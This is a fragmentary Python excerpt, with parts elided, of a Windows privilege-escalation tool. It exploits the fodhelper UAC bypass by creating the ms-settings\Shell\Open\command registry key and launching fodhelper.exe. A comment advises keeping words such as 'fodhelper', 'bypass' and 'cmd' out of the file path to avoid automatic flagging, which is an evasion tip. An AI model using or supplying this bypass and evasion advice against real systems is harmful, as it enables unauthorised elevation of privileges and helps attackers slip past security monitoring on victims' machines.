...
def set_bypass():
    ...
    current_file_path = sys.argv[0] # The path must not contain "sensitive" words like 'fodhelper', 'bypass', 'cmd', '.py', '.vbs', '.bat', etc. Such words are flagged automatically
    ...
    if windll.shell32.ShellExecuteW(None, "open", r"C:\Windows\System32\fodhelper.exe", None, None, 0) <= 32: # Launch the fodhelper.exe to trigger the UAC prompt
        print("[-] Error while running fodhelper.")
...
def main():
    key_path = r"Software\Classes\ms-settings\Shell\Open\command"  # Path of the registry key to be created for exploiting the Fodhelper vulnerability
